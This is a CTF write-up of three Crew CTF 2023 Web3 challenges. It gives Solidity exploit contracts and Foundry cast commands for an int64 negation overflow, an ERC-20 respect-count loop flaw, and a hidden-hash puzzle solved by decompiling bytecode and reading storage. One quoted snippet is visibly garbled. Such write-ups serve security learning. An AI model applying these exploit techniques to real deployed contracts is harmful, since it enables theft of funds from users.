---
title: Crew CTF 2023 Web3 Writeups
date: 2023-07-09
readtime: true
tags: [web3,blockchain,ctf,crewctf]
---

## Challenge 1 : Positive

This challenge proved to be fairly straightforward as we were provided with two smart contracts, namely `Setup.sol` and `Positive.sol`. Within the setup contract's constructor, a new instance of the `Positive` contract is created and stored in a state variable called `TARGET`.

```
pragma solidity =0.7.6;

import "./Positive.sol";

contract Setup {
    Positive public immutable TARGET;

    constructor() payable {
        TARGET = new Positive(); 
    }

    function isSolved() public view returns (bool) {
        return TARGET.solved();
    }
}

```

The goal of the challenge is to make the function `isSolved()` return true. Let's explore the Positive contract.
```
// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

contract Positive{
    bool public solved;

    constructor() {
        solved = false;
    }

    function stayPositive(int64 _num) public returns(int64){
        int64 num;

        if(_num<0){
            num = -_num;
            if(num<0){
                solved = true;
            }
            return num;
        }
        num = _num;
        return num;
    }

}
```


The `stayPositive` function takes an int64 value as input, and in order to set the state variable `solved` to `true`, the input must meet certain conditions. By utilizing the minimum value for int64, which is `-9223372036854775808`, all of these conditions are satisfied, resulting in the state variable solved being set to `true`. Now, let's craft an exploit using forge.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Setup.sol";
import "../src/Positive.sol";

contract Hack{
    Setup setup;
    function setUp()public{
        setup = new Setup();
    }

    function testExploit()public{
        Positive positive = Positive(setup.TARGET());
        positive.stayPositive(-9223372036854775808);
        console.log(setup.isSolved());
    }
}

```

![](/images/ctfs/crewctf23/crewctf-web31.png)

In order to get the flag, we follow the following steps:

1. Launch a new instance by connecting to the provided server.
2. Save the `rpc endpoint`,`private key` and the address of the `setup contract`, provided by the server.
3. Retrieve the address of the Positive contract using the following command:
```
cast call <> "TARGET()" --rpc-url <your_rpc_url> --private-key <your_private_key>
```
4. Execute the `stayPositive` function within the Positive contract by executing the following command:
```
cast send <positiveContract> "stayPositive(int64)" --private-key <yourPrivateKey> --rpc-url <your_rpc_url> -- -9223372036854775808
```
5. Connect to the server and read the flag!


## Challenge 2: Infinite

This was an interesting challenge involving [ERC-20](https://ethereum.org/en/developers/docs/standards/tokens/erc-20/) tokens. We're given 6 files: `candyToken.sol`, `crewToken.sol`, `fancyStore.sol`, `localGang.sol`,`respectToken.sol`,`Setup.sol`. In order to solve the challenge, we need to satisfy the following condition:
```
function isSolved() public view returns (bool) {
    return STORE.respectCount(CREW.receiver())>=50 ;
}
```

### Source Code Analysis

1. The tokens `crewToken`, `candyToken`, and `respectToken` are simple `ERC-20` tokens.

2. The `localGang` contract comprises a constructor and two functions: `gainRespect` and `loseRespect`.

- gainRespect: Transfers candyTokens from `msg.sender` to `localGang` and mints an equivalent number of respectTokens for `msg.sender`.

- loseRespect: Burns a specified number of respectTokens provided as a function argument and transfers an equal amount of candyTokens to the caller of the function.

3. The `fancyStore` contract consists of a constructor and four functions: `verification`, `buyCandies`, `respectIncreasesWithTime`, and `sellCandies`.

- verification: Takes 1 crew token and mints 10 candyTokens for `msg.sender`.

- buyCandies: Transfers `requestTokens` from the caller to the fancyStore and mints the same number of `candyTokens` for the caller. Additionally, it increments the `respectCount` for the caller.

- respectIncreasesWithTime: This function is irrelevant and can be disregarded.

- sellCandies: Burns candyTokens and transfers an equal number of respectTokens to the caller. Additionally, it reduces the `respectCount` for the caller.

### Plan of Attack
To augment the `respectCount`, we need to invoke the `buyCandies` function multiple times. However, we encounter a limitation as we only possess `10 candyTokens` initially (with the ability to mint 10 candyTokens using 1 crew token). Nevertheless, we observe that unlike the `sellCandies` function, the `gainRespect` function does not diminish the `respectCount`. Consequently, we can execute the `gainRespect` function (to boost the number of respectTokens) followed by the `buyCandies` function to convert those `candyTokens` into `respectTokens`, thereby amplifying `respectCount[msg.sender]`. This process can be repeated in a cycle until `respectCount[msg.sender]` reaches a sufficient level to meet the condition required to solve the challenge.

### Forge: test exploit

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Setup.sol";
import "../src/candyToken.sol";
import "../src/crewToken.sol";
import "../src/respectToken.sol";
import "../src/fancyStore.sol";
import "../src/localGang.sol";

contract Exploit is Test{
    Setup _setup;
    crewToken _crewToken;
    candyToken _candyToken;
    respectToken _respectToken;
    fancyStore _fancyStore;
    localGang _localGang;

    function setUp()public{
        _setup = new Setup();
        _crewToken = _setup.CREW();
        _candyToken = _setup.CANDY();
        _respectToken = _setup.RESPECT();
        _fancyStore = _setup.STORE();
        _localGang = _setup.GANG();
    }

    function testExploit()public{
        _crewToken.mint(); // Mint 1 crew token
        _crewToken.approve(address(_fancyStore),1);

        _fancyStore.verification(); // Mint 10 candyTokens

        // Gain respect
        _candyToken.approve(address(_localGang),100); // Approve localGang to spend candyTokens on our behalf
        _localGang.gainRespect(5); // Mint 5 respect tokens.

        // Buy candies
        _respectToken.approve(address(_fancyStore),100); // Approve fancyStore to spend respectTokens of our behalf
        _fancyStore.buyCandies(5); // Increase respectCount[msg.sender] by 5 and mint 5 candyTokens.

        for(uint256 i=0;i<10;i++){
            _localGang.gainRespect(5);
            _fancyStore.buyCandies(5);
        }

        assert(_fancyStore.respectCount(address(this))>50);
        console.log(_setup.isSolved());
    }

}

```
Let's run this exploit:

![](/images/ctfs/crewctf23/crewctf-web32.png)

Great! The exploit is functioning smoothly, which means it's time to retrieve the flag. Now, let's proceed with modifying our test exploit:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Setup.sol";
import "../src/candyToken.sol";
import "../src/crewToken.sol";
import "../src/respectToken.sol";
import "../src/fancyStore.sol";
import "../src/localGang.sol";

contract Exploit{
    Setup _setup;
    crewToken _crewToken;
    candyToken _candyToken;
    respectToken _respectToken;
    fancyStore _fancyStore;
    localGang _localGang;


    constructor(){
        _setup =  Setup(<address_of_your_setup_contract>);
        _crewToken = _setup.CREW();
        _candyToken = _setup.CANDY();
        _respectToken = _setup.RESPECT();
        _fancyStore = _setup.STORE();
        _localGang = _setup.GANG();
    }

    function testExploit()public{
        _crewToken.mint(); // Mint 1 crew token
        _crewToken.approve(address(_fancyStore),1);
        _fancyStore.verification(); // Mint 10 candies

        // Gain respect
        _candyToken.approve(address(_localGang),100);
        _localGang.gainRespect(5);

        // Buy candies
        _respectToken.approve(address(_fancyStore),100);
        _fancyStore.buyCandies(5);

        for(uint256 i=0;i<10;i++){
            _localGang.gainRespect(5);
            _fancyStore.buyCandies(5);
        }

    }
}

```
1. Launch a new instance by connecting to the provided server.
2. Save the `rpc endpoint`,`private key` and the address of the `setup contract`, provided by the server.
3. Deploy the exploit contract
```
forge create ./test/Exploit.sol:Exploit --private-key <your_private_key> --rpc-url <your_rpc_url>
```
4. Call the `testExploit` function (present in the exploit contract)
```
cast send <address_of_exploit_contract> "testExploit()" --rpc-url <your_rpc_url> --private-key <your_private_key>
```
5. Connect to the server and get the flag.

![](/images/ctfs/crewctf23/crewctf-web33.png)

## Challenge 3: Deception
Just as the name suggests, there was a deception over here. Upon analyzing the `solve` function in the provided file `Deception.sol`, we discover that if the `keccak256` hash of our input evaluates to `0x65462b0520ef7d3df61b9992ed3bea0c56ead753be7c8b3614e0ce01e4cac41b`, the variable `solved` is set to `true`. Through a Google search, we ascertain that this hash corresponds to the string `secret`.

```
function solve(string memory secret) public {
    require(keccak256(abi.encodePacked(secret))== function solve(string memory secret) public {
      require(keccak256(abi.encodePacked(secret))==0x65462b0520ef7d3df61b9992ed3bea0c56ead753be7c8b3614e0ce01e4cac41b, "invalid");
      solved = true;
    }, "invalid");
    solved = true;
}
```

However, a deception is present in the remote instance, as the program does not compare the hash of our input with the aforementioned hash. Instead, it compares it with something else. To successfully solve this challenge, we need to follow the steps outlined below:

1. Launch a new instance by connecting to the provided server.
2. Save the `rpc endpoint`,`private key` and the address of the `setup contract`, provided by the server.
3. Retrieve the address of the `deception` contract using the following command:
```
cast call <your_setup_contract> "TARGET()" --rpc-url <your_rpc_url> --private-key <your_private_key>
```
4. Get the runtime bytecode of the `deception` contract
```
cast code <your_deception_contract> --rpc-url <your_rpc_url>
```
5. Decompile the bytecode [here](https://library.dedaub.com/decompile)
![](/images/ctfs/crewctf23/crewctf-web34.png)

The decompiled code is pretty weird but we quickly spot that the keccak256 hash of the input is being compared with some different hash. 
```
function 0x76fe1e92(uint256 varg0) public payable { 
    // TLDR

    require(0xdb91bc5e087269e83dad667aa9d10c334acd7c63657ca8a58346bb89b9319348 == keccak256(v1), Error('invalid'));
    _solved = 1;
}
```
Conducting Google searches about this hash does not yield any valuable results . However, there's an interesting line present in the function `password()`
```
v4 = _SafeAdd(0x616263, stor_3);
```
`0x616263` means `abc` but the keccak256 hash of `abc` isn't `0xdb91bc5e087269e83dad667aa9d10c334acd7c63657ca8a58346bb89b9319348`. Analyzing the `storage` layout of the `deception` contract, we get something interesting stored at the third slot
```
cast storage <your_deception_contract> 3 --rpc-url <your_rpc_url>
```
```
0x000000000000000000000000000000000000000000000000000000000078797a
```

The hexadecimal value `0x78797a` corresponds to the string `xyz`. When combined with `abc`, it results in `xyzabc`. Taking the `keccak256` hash of `xyzabc` yields `0xdb91bc5e087269e83dad667aa9d10c334acd7c63657ca8a58346bb89b9319348` which is the target hash.

6. Invoke the `solve` function, passing the string argument `xyzabc`.
```
cast send <your_deception_contract> "solve(string)" "xyzabc" --private-key <your_private_key> --rpc-url <your_rpc_url>
```
7. Connect to the server and get the flag
![](/images/ctfs/crewctf23/crewctf-web35.png)
